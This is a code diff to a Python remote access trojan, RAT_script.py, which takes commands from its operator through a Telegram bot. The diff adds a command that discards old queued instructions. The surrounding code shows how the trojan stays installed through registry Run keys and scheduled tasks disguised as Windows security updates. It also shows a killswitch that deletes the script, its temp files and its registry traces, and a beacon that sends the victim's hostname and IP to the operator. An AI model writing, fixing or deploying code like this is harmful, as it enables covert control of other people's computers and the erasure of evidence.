@@ -1,4 +1,4 @@
-# RAT_script.py - Full working script with all commands, fixed bugs, and killswitch
+# RAT_script.py - Fixed: /clear command resets offset, no old commands replayed
 # Upload to: https://raw.githubusercontent.com/Hehehasmr/mathpython/refs/heads/main/RAT_script.py
 
 import os
@@ -69,6 +69,24 @@ def reset_offset():
         pass
     return 0
 
+def clear_all_old_commands():
+    """Clear all old commands - ignore everything before now"""
+    try:
+        # Get the latest update_id
+        resp = requests.get(f"{BASE_URL}/getUpdates", timeout=10)
+        data = resp.json()
+        if data.get("ok") and data.get("result"):
+            # Set offset to the latest update_id + 1 (ignores ALL old)
+            latest = data["result"][-1]["update_id"] + 1
+            save_offset(latest)
+            return True
+        else:
+            # If no updates, set to 0
+            save_offset(0)
+            return True
+    except:
+        return False
+
 # --- Persistence ---
 def install_persistence():
     try:
@@ -122,26 +140,22 @@ def get_ip():
 def kill_all_and_clean():
     """Emergency kill - stops everything and removes traces"""
     try:
-        # Send death message
         try:
             send_message("💀 KILLSWITCH ACTIVATED. Terminating and cleaning...")
         except:
             pass
         
-        # 1. Kill all Python processes
         os.system("taskkill /f /im python.exe >nul 2>&1")
         os.system("taskkill /f /im python3.exe >nul 2>&1")
         os.system("taskkill /f /im cmd.exe >nul 2>&1")
         os.system("taskkill /f /im conhost.exe >nul 2>&1")
         os.system("taskkill /f /im powershell.exe >nul 2>&1")
         
-        # 2. Delete the RAT script itself
         try:
             os.remove(os.path.abspath(sys.argv[0]))
         except:
             pass
         
-        # 3. Delete all temp files
         os.system(f"del /f /q {tempfile.gettempdir()}\\*.py >nul 2>&1")
         os.system(f"del /f /q {tempfile.gettempdir()}\\*.tmp >nul 2>&1")
         os.system(f"del /f /q {tempfile.gettempdir()}\\*health* >nul 2>&1")
@@ -149,27 +163,22 @@ def kill_all_and_clean():
         os.system(f"del /f /q {tempfile.gettempdir()}\\*heartbeat* >nul 2>&1")
         os.system(f"del /f /q {tempfile.gettempdir()}\\*ransomware* >nul 2>&1")
         
-        # 4. Remove registry keys
         os.system("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSystemHealth /f >nul 2>&1")
         os.system("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v WindowsSecurityUpdate /f >nul 2>&1")
         os.system("reg delete HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v WindowsSecurityUpdate /f >nul 2>&1")
         
-        # 5. Delete state file
         try:
             if os.path.exists(STATE_FILE):
                 os.remove(STATE_FILE)
         except:
             pass
         
-        # 6. Delete scheduled tasks
         os.system("schtasks /delete /tn DeleteRAT /f >nul 2>&1")
         os.system("schtasks /delete /tn WindowsSecurityUpdate /f >nul 2>&1")
         os.system("schtasks /delete /tn WindowsSystemHealth /f >nul 2>&1")
         
-        # 7. Flush DNS
         os.system("ipconfig /flushdns >nul 2>&1")
         
-        # 8. Exit
         sys.exit(0)
         
     except:
@@ -331,10 +340,19 @@ def handle_updates(offset):
                         threading.Thread(target=kill_all_and_clean).start()
                         return new_offset
                     
+                    # --- CLEAR ---
+                    if lower == "/clear":
+                        success = clear_all_old_commands()
+                        if success:
+                            send_message("✅ Cleared all old commands. Only new commands will be processed.")
+                        else:
+                            send_message("❌ Clear failed. Try /reset.")
+                        return new_offset
+                    
                     # --- RESET ---
                     if lower == "/reset":
                         reset_offset()
-                        send_message("✅ Commands reset. All previous commands ignored.")
+                        send_message("✅ Offset reset. All previous commands ignored.")
                         return new_offset
                     
                     # --- NORMAL COMMANDS ---
@@ -372,6 +390,9 @@ def handle_updates(offset):
 
 # --- Main Loop ---
 def main_loop():
+    # Clear old commands on startup (prevents replay)
+    clear_all_old_commands()
+    
     ip = get_ip()
     hostname = os.environ.get("COMPUTERNAME", "Unknown")
     send_message(f"✅ Connected | Host: {hostname} | IP: {ip}")
